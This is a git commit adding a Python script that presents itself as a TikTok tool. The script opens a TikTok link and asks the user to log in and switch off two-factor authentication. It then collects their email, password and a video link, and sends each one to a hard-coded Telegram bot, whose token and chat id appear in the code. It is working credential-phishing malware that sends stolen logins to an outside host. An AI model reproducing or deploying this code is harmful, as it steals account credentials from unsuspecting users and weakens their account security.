7d6731a4ff758a1b1f57d63bc561ae7af8dc9b2f
Crazy 10100 <115801330+Crazy10100@users.noreply.github.com>
2023-02-28 14:13:36 +0600

    Hi
    Hell

---
+++ tik tok F.py
@@ -0,0 +1,77 @@
+print ("""
+  ______                                         
+ /      \                                        
+/$$$$$$  |  ______   ______   ________  __    __ 
+$$ |  $$/  /      \ /      \ /        |/  |  /  |
+$$ |      /$$$$$$  |$$$$$$  |$$$$$$$$/ $$ |  $$ |
+$$ |   __ $$ |  $$/ /    $$ |  /  $$/  $$ |  $$ |
+$$ \__/  |$$ |     /$$$$$$$ | /$$$$/__ $$ \__$$ |
+$$    $$/ $$ |     $$    $$ |/$$      |$$    $$ |
+ $$$$$$/  $$/       $$$$$$$/ $$$$$$$$/  $$$$$$$ |
+                                       /  \__$$ |
+                                       $$    $$/ 
+                                        $$$$$$/  
+""""")
+print ("Check My TikTok Account ")
+
+print ("Enter the [Y ]")
+
+number=str(input("  : "))
+
+import webbrowser
+webbrowser.open('https://vt.tiktok.com/ZS896hT2a/', new=2)
+
+number=str(input("ENTER YOUR NAME  : "))
+
+print ("""""
+ /$$$$$$$$ /$$$$$$ /$$   /$$       /$$$$$$$$ /$$$$$$  /$$   /$$
+|__  $$__/|_  $$_/| $$  /$$/      |__  $$__//$$__  $$| $$  /$$/
+   | $$     | $$  | $$ /$$/          | $$  | $$  \ $$| $$ /$$/ 
+   | $$     | $$  | $$$$$/           | $$  | $$  | $$| $$$$$/  
+   | $$     | $$  | $$  $$           | $$  | $$  | $$| $$  $$  
+   | $$     | $$  | $$\  $$          | $$  | $$  | $$| $$\  $$ 
+   | $$    /$$$$$$| $$ \  $$         | $$  |  $$$$$$/| $$ \  $$
+   |__/   |______/|__/  \__/         |__/   \______/ |__/  \__/
+                                                               
+                                                               
+                                                               
+""""")
+
+print ("          ")
+
+print ("              Login Your TikTok Account")
+print ("              Please Off Your  two-factor authentication Code ")
+
+print ("             ")
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" Enter Your Email : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" Enter Your Password : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+import requests
+TOKEN = "5872557622:AAGPep1UeDgXa4DQHvndC08nFeTJ35Nun-E"
+chat_id = "5347353883"
+message = str(input(" Enter The video link : "))
+url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
+print(requests.get(url).json()) # this sends the message
+
+# You Can Change The Key's Name. But don't Change The Values.
+
+print ("       ")
+print ("       ")
+print ("                 Please wait 24 hour")
+	
